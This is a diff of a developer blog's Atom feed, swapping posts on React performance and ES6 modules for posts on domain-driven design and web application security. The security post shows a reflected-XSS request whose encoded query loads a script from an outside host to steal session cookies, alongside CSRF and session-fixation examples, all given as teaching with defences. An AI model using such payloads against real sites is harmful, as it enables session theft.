-The key takeaway here is that the React diffing process is a &lt;b&gt;trade-off&lt;/b&gt;. It is not necessarily the optimal algorithm for diffing random trees, but it works well in real life scenarios, which is what we ultimately care about.
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;measuring-performance&quot;&gt;Measuring Performance&lt;/h2&gt;
-&lt;p&gt;With all the nice performance features built in, there will still occasionally come a time where you need to profile the performance of your components. &lt;em&gt;ReactPerf&lt;/em&gt; is a tool that gives an overview about an app’s overall performance and helps discover optimization opportunities where &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; lifecycle hooks should be implemented. The Perf object is available as a React add-on and can be used with React in development mode only. You should not include this bundle when building your app for production.&lt;/p&gt;
-
-&lt;p&gt;Installing it is simple:&lt;/p&gt;
-
-&lt;pre&gt;
-npm install --save react-addons-perf
-&lt;/pre&gt;
-
-&lt;p&gt;…and it comes with a bunch of nifty methods which you can pepper throughout your code.&lt;/p&gt;
-
-&lt;p&gt;Here’s what it includes:&lt;/p&gt;
-
-&lt;pre&gt;
-// starts the measurment
-Perf.start()
-
-// stops the measurement
-Perf.stop()
-
-// prints the whole time
-Perf.printInclusive()
-
-// prints the whole time
-Perf.printExclusive()
-
-// prints wasted time
-Perf.printWasted()
-&lt;/pre&gt;
-
-&lt;p&gt;The easiest way to use it is to just wrap your whole &lt;em&gt;&lt;App&gt;&lt;/App&gt;&lt;/em&gt; component and then display statics.&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/06c305c1c4781ff69e150a06482d9c3a.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;The output of the library is something like this, which should give you hints on what components can be optimized:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/reactperf.png&quot; alt=&quot;react-perf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As I mentioned previously, if a parent component changes, React re-renders all the children, but there is a way to override this. It also provides the &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; lifecycle method, which is triggered before the re-rendering process starts and provides the possibility of not computing a render tree entirely—the method receives &lt;em&gt;nextProps&lt;/em&gt; and &lt;em&gt;nextState&lt;/em&gt; as arguments, and you should return either true or false to tell React if the component needs to be re-rendered. It defaults to true, but if you return false, the component is considered clean, and therefore no diffing or rendering is performed.&lt;/p&gt;
-
-&lt;p&gt;The default implementation of &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; is a simple function that always returns true. ReactPerf helps us figure out where time is being wasted on unnecessary redraws and where it might make sense to override this function but keep in mind that your implementation needs to be faster than actually re-rendering the component, otherwise you not only wasted development time, you’ve made the performance of your app worse.&lt;/p&gt;
-
-&lt;h2 id=&quot;immutability-to-the-rescue&quot;&gt;Immutability To The Rescue&lt;/h2&gt;
-&lt;p&gt;Immutability as a concept is useful because in functional programming you work with &lt;em&gt;values&lt;/em&gt; NOT &lt;em&gt;variables&lt;/em&gt;. This means your first class citizens are functions not objects, and functions by definition work with values, as opposed to objects which have a mutable state.&lt;/p&gt;
-
-&lt;p&gt;But an interesting side effect of using immutable values for state, is that it actually makes React’s diffing performance better. Since a library like ImmutableJs creates a new object instance for properties in an object that have changed, just doing a normal compare is going to tell React that something inside a complex object tree has changed, without the need to go recursively down the tree and check EACH property.&lt;/p&gt;</content><author><name></name></author><summary type="html">React is fast. If you’re coming from the world of Angular, you might think it’s REALLY, REALLY fast. But no matter how fast a library is, there will come a time when you will encounter performance bottlenecks, especially if you are building something like a page that has infinite scrolling and you end up with a lot of objects on your page. Which is why it’s important to understand how React handles component updates and how its reconciliation process works.</summary></entry><entry><title type="html">The Pesky Javascript “This” Keyword</title><link href="http://localhost:4000/js-this" rel="alternate" type="text/html" title="The Pesky Javascript &quot;This&quot; Keyword" /><published>2017-09-27T06:39:37+03:00</published><updated>2017-09-27T06:39:37+03:00</updated><id>http://localhost:4000/js-this</id><content type="html" xml:base="http://localhost:4000/js-this">&lt;p&gt;Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-12-29T11:59:50+02:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
+</subtitle><entry><title type="html">The Pesky Javascript “This” Keyword</title><link href="http://localhost:4000/js-this" rel="alternate" type="text/html" title="The Pesky Javascript &quot;This&quot; Keyword" /><published>2018-09-27T06:39:37+03:00</published><updated>2018-09-27T06:39:37+03:00</updated><id>http://localhost:4000/js-this</id><content type="html" xml:base="http://localhost:4000/js-this">&lt;p&gt;Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):&lt;/p&gt;
 
 &lt;script src=&quot;https://gist.github.com/toaderflorin/9ef524ab66712f8eacec0468bc3d649b.js&quot;&gt;&lt;/script&gt;
 
@@ -367,72 +61,7 @@ Perf.printWasted()
 
 &lt;/blockquote&gt;
 
-&lt;p&gt;We used a &lt;em&gt;lambda&lt;/em&gt; or inline function. Keep in mind these have no effect on the &lt;em&gt;this&lt;/em&gt; keyword but are an ES6 feature which might not be supported by older browsers. Oh, and ditch jQuery altogether, I was just using it as an example.&lt;/p&gt;</content><author><name></name></author><summary type="html">Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):</summary></entry><entry><title type="html">ES6 Modules And Node.js</title><link href="http://localhost:4000/es6-modules-node" rel="alternate" type="text/html" title="ES6 Modules And Node.js" /><published>2017-09-23T09:39:37+03:00</published><updated>2017-09-23T09:39:37+03:00</updated><id>http://localhost:4000/es6-modules-node</id><content type="html" xml:base="http://localhost:4000/es6-modules-node">&lt;p&gt;With the addition of &lt;em&gt;async/await&lt;/em&gt; and classes in Javascript and subsequently in V8, many more developers started taking Node.js seriously as a web development platform. I do believe Node was worth considering before, but I see their point—its asynchronous nature made callbacks quite unpleasant to work with. Promise chaining changed this a bit, but it’s a far cry from writing code using async/await and actually, as of lately, it’s possible to write Javascript serverside code almost entirely in ES6 without Babel, with a notable exception…&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/es6-mods.jpg&quot; alt=&quot;es6-mods&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;You cannot use ES6 imports YET.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Which seems to be a little bit weird because you’d guess that it’s probably one of the easiest things to be implemented in a JS engine. But you’d be wrong because supporting this of Node.js is not exactly a walk in the park, considering there are quite a lot of applications out there and they using a different module standard: CommonJS.&lt;/p&gt;
-
-&lt;p&gt;And serverside applications are a big part of the JS landscape.&lt;/p&gt;
-
-&lt;h2 id=&quot;es6-modules-versus-commonjs&quot;&gt;ES6 Modules Versus CommonJS&lt;/h2&gt;
-&lt;p&gt;On the surface, they seem similar, but they are not. There is a fundamental difference between the two: &lt;em&gt;the code in the CommonJS module needs to be executed to see what that module exports, whereas an ES6 module needs only to be parsed (compiled).&lt;/em&gt;&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/5876ea604202b6a97e4ddef1d96bf6ee.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;whereas ES6 exports look like this:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/7ba115e874be93f08cca634b0990ac1b.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;&lt;em&gt;Ideally, we’d want to be able to write new ES6 code that would run alongside old code, which means we want to be able to import CommonJS modules, as well as require new ES6 modules.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;So what a CJS module exports is available only at runtime, NOT at compile time (remember V8 does just-in-time compilation). Also, the existing &lt;em&gt;require()&lt;/em&gt; function is synchronous, whereas the ES6 specification states that imports can be async (but DON’T HAVE TO BE, which is good news for Node). Changing the existing implementation for &lt;em&gt;require()&lt;/em&gt; would also break a lot of the existing libraries which make assumptions about the way it works. Since the require function is synchronous, module resolution in CJS happens in one event loop tick. With ES6, the module is first parsed and its interface inferred, and ONLY THEN evaluated, so it might take multiple ticks.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;This means it won’t be possible to change &lt;em&gt;require()&lt;/em&gt; to import ES6 modules. The alternative would be to create a new &lt;em&gt;require.import()&lt;/em&gt; function, but this isn’t as nice.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;It does however mean that ES6 modules will be able to import CommonJS modules, because they happen in one tick. The tricky part here is figuring if a module is ES6 or CommonJS.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Browsers know that a module is ES6 or not like this:&lt;/p&gt;
-&lt;pre&gt;
-&amp;lt;script type=&quot;module&quot; src=&quot;./es6module.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
-&lt;/pre&gt;
-
-&lt;p&gt;However Node.js doesn’t have that luxury. The solution the community agreed upon was using &lt;em&gt;.mjs&lt;/em&gt; files to denote ES6 modules, also affectionately  named the &lt;strong&gt;Michael Jackson Solution&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;While this is work in progress, so far it’s fair to assume that:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;The &lt;em&gt;require()&lt;/em&gt; function won’t be available in ES6 module files.&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;import&lt;/em&gt; won’t be available to CommonJS modules.&lt;/li&gt;
-  &lt;li&gt;ES6 modules will be able to import CJS modules, as well as other ES6 modules (obviously).&lt;/li&gt;
-  &lt;li&gt;CJS modules will be able to &lt;em&gt;require.import()&lt;/em&gt; ES6 modules, as well as other CJS modules using &lt;em&gt;require()&lt;/em&gt; like before.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Also, there is an issue with named imports when importing a CommonJS module. The difference again has to do with with the fact the public interface of an ES6 module can be determined at compile time, whereas CommonJS modules actually have to be executed.&lt;/p&gt;
-
-&lt;p&gt;Which means for a CJS module that looks like this:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/9767933b001009e22e308646bded11fb.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;The importing code would look like:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/065b799bf404d013d39990d9f19d9482.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;Keep in mind that defaultImport will not be ‘some_text’ because &lt;em&gt;import&lt;/em&gt; doesn’t evaluate the code. It would actually be an object containing all the objects declared which would look like this in our case:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/8479c5631752575058c1e79237a618eb.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;Floating is a typical way of&lt;/p&gt;
-
-&lt;p&gt;Also, we are probably looking at beginning 2018 before any of this functionality is available.&lt;/p&gt;</content><author><name></name></author><summary type="html">With the addition of async/await and classes in Javascript and subsequently in V8, many more developers started taking Node.js seriously as a web development platform. I do believe Node was worth considering before, but I see their point—its asynchronous nature made callbacks quite unpleasant to work with. Promise chaining changed this a bit, but it’s a far cry from writing code using async/await and actually, as of lately, it’s possible to write Javascript serverside code almost entirely in ES6 without Babel, with a notable exception…</summary></entry><entry><title type="html">HTML Layout: The Weird Parts</title><link href="http://localhost:4000/weird-html" rel="alternate" type="text/html" title="HTML Layout: The Weird Parts" /><published>2017-09-15T06:39:37+03:00</published><updated>2017-09-15T06:39:37+03:00</updated><id>http://localhost:4000/weird-html</id><content type="html" xml:base="http://localhost:4000/weird-html">&lt;p&gt;If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:&lt;/p&gt;
+&lt;p&gt;We used a &lt;em&gt;lambda&lt;/em&gt; or inline function. Keep in mind these have no effect on the &lt;em&gt;this&lt;/em&gt; keyword but are an ES6 feature which might not be supported by older browsers. Oh, and ditch jQuery altogether, I was just using it as an example.&lt;/p&gt;</content><author><name></name></author><summary type="html">Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):</summary></entry><entry><title type="html">HTML Layout: The Weird Parts</title><link href="http://localhost:4000/weird-html" rel="alternate" type="text/html" title="HTML Layout: The Weird Parts" /><published>2018-09-15T06:39:37+03:00</published><updated>2018-09-15T06:39:37+03:00</updated><id>http://localhost:4000/weird-html</id><content type="html" xml:base="http://localhost:4000/weird-html">&lt;p&gt;If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;HTML evolved overtime, and sometimes a bit chaotically. It wasn’t thought out from the start in its current form.&lt;/em&gt;&lt;/p&gt;
 
@@ -543,7 +172,164 @@ What I did was add an empty div at the end of the parent container, like so:&lt;
 &lt;p&gt;If your browser doesn’t support &lt;em&gt;calc&lt;/em&gt;, there are other ways to do it such as using line-height (which works only for text) or using &lt;em&gt;display: table-cell&lt;/em&gt;. Obviously, these are a bit hackish.&lt;/p&gt;
 
 &lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is actually quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2017-09-09T06:39:37+03:00</published><updated>2017-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;
+&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is actually quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">Domain Driven Design</title><link href="http://localhost:4000/ddd" rel="alternate" type="text/html" title="Domain Driven Design" /><published>2018-07-28T09:39:37+03:00</published><updated>2018-07-28T09:39:37+03:00</updated><id>http://localhost:4000/ddd</id><content type="html" xml:base="http://localhost:4000/ddd">&lt;p&gt;If you ask five different developers what they understand by domain driven design, you are most likely going to get five different answers. To make matters slightly worse and even if they did one did thoroughly read Eric Evan’s book, it’s not readily apparent how one would go about extracting a canonical definition. Virtually everybody working in the field of software development agrees that properly architecting an application is extremely important – just like a poorly constructed building, a software project lacking a solid architectural background can easily come crashing down after a while. But unlike with building, with software because of its fluid nature there’s always the feeling that one can build functionality poorly initially and then go back and change things. The problem with this is if new functionality is built on top of the old one, it never ends up happening, so constructing a solid foundation is extremely important.&lt;/p&gt;
+
+&lt;p&gt;One common definition of DDD that gets thrown around quite a bit is that it’s a top-down way of looking at the development process, but whether somebody subscribes to that definition also depends it depends on what exactly is understood by &lt;em&gt;top&lt;/em&gt; and &lt;em&gt;down&lt;/em&gt;. Ultimately, when we’re creating software we’re trying to solve a problem for somebody – be it another person or business, so in that sense, top-down makes sense. Unfortunately, there is also another definition of top down that is also quite popular and one that’s causing many-a-developer that have to cleanup code a lot of headaches. Keeping in line with definition, it’s quite normal to start with the UI and then work down from there because that’s the part that’s visible. Unfortunately this makes for very, very bad practice. The reason for why it’s such a bad practice is it is actually the backend and not the frontend that is the foundation of any software system, so a well architected backend is crucial.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-ddd-isnt&quot;&gt;What DDD isn’t&lt;/h2&gt;
+&lt;p&gt;Quite often, developers have a very poor understanding of how the or user or customers are actually using the application and sometimes even UX designers have trouble with it because users might not necessarily conform to the clearly thought out scenarios that they’ve planned beforehand. Customer support definitely has that understanding and ideally so should the product owner.&lt;/p&gt;
+
+&lt;p&gt;When ORMs entered the scene, they put the concept of a model or entity at the forefront. All of a sudden developers didn’t really have to concern themselves with low level database queries, join tables in case of many-to-many relations etc. We could just focus on defining the objects and the levels between them and the library would take care of the rest. All this might sound quite familiar and in effect what we’ve described is a model driven architecture approach.  While DDD certainly is compatible with this approach, there is a bit more to it and we’ll get into it shortly.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;class Customer
+{
+  public Id { get; set; }
+  public FullName { get; set; }
+  public Address { get; set; }
+} 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Of course, a domain expert isn’t interested things like databases (SQL vs NoSQL), comunication protocols like REST or gRPC and so forth. Domain experts aren’t interested necesarily in UX either, all these things come afterwards. These things pertain to &lt;em&gt;how&lt;/em&gt; the business goal is achieved not to &lt;em&gt;what&lt;/em&gt; the business goal is.&lt;/p&gt;
+
+&lt;p&gt;Domain modeling mandates that the software team defines the &lt;em&gt;what&lt;/em&gt; first.&lt;/p&gt;
+
+&lt;!-- While a PO will most certainly not write any code, he or she can definitely define something like this in enterprise architect.  --&gt;
+
+&lt;h2 id=&quot;enter-ddd&quot;&gt;Enter DDD&lt;/h2&gt;
+&lt;p&gt;DDD is actually a bit more prescriptive when it comes to doing things and it introduces more concepts such as&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Entity (what we just discussed)&lt;/li&gt;
+  &lt;li&gt;Aggregate (a group of entities that can be treaded as a standalone enitity)&lt;/li&gt;
+  &lt;li&gt;Service&lt;/li&gt;
+  &lt;li&gt;Domain events&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We’ve covered entities at length. Of course, entities don’t exist in a void and they don’t make up for the entirety of our domain beause we also care between interactions.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bounded.png&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;While a lack of technical or programing skills can be a problem in some cases, communication issues are much more prevalent in software projects – words mean different things to different people, and it all depends on the context so at the core of DDD lies a concept ccalled &lt;em&gt;ubiquitous language&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;I’d like to argue that DDD as a methodology pushes this approach. Which is where ubiquitous language comes into play.&lt;/p&gt;
+
+&lt;h2 id=&quot;event-storming&quot;&gt;Event storming&lt;/h2&gt;
+&lt;p&gt;You can do event storming outside the context of DDD but if you aren’t doing event storming, you are probably not doing DDD bby the book. Obviously, the goal is before the developers decide the technology stack, the approach etc. they know what exactly they are going to acomplish (the fact that they have to stand up while doing it also forces them to expedite matters).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/storming.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first step is to find the domain events and write them on orange sticky notes. When all domain events are found the second step is to find for each domain event the command that caused it. Commands are written on blue notes and placed directly before the corresponding domain event. In the third step the aggregates are identified on which the commands are executed and to which happen the domain events. The aggregates are written in yellow stickies.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you ask five different developers what they understand by domain driven design, you are most likely going to get five different answers. To make matters slightly worse and even if they did one did thoroughly read Eric Evan’s book, it’s not readily apparent how one would go about extracting a canonical definition. Virtually everybody working in the field of software development agrees that properly architecting an application is extremely important – just like a poorly constructed building, a software project lacking a solid architectural background can easily come crashing down after a while. But unlike with building, with software because of its fluid nature there’s always the feeling that one can build functionality poorly initially and then go back and change things. The problem with this is if new functionality is built on top of the old one, it never ends up happening, so constructing a solid foundation is extremely important.</summary></entry><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2018-07-28T09:39:37+03:00</published><updated>2018-07-28T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password in order to “perform some maintenance”.&lt;/p&gt;
+
+&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
+&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam whereby he received an email made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I actually want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t really have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
+  &lt;li&gt;Session hijacking&lt;/li&gt;
+  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
+  &lt;li&gt;SQL injection&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
+&lt;p&gt;XSS refers to a vulnerability where an attacker is able to “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://achiral.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?search=something
+&lt;/pre&gt;
+
+&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
+  HTTP/1.1
+&lt;/pre&gt;
+
+&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
+
+&lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
+  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt; etc.&lt;/p&gt;
+
+&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
+&lt;p&gt;Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;
+
+&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;
+
+&lt;p&gt;Another way to gain access to a user’s session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;
+
+&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;
+
+&lt;pre&gt;
+http://www.website.com?sid=asb1sadasdasdan23123
+&lt;/pre&gt;
+
+&lt;p&gt;The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;
+
+&lt;blockquote&gt;
+Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
+&lt;/blockquote&gt;
+
+&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
+&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;
+
+&lt;pre&gt;
+GET https://www.thesite.com/account?password=val HTTP/1.1
+&lt;/pre&gt;
+
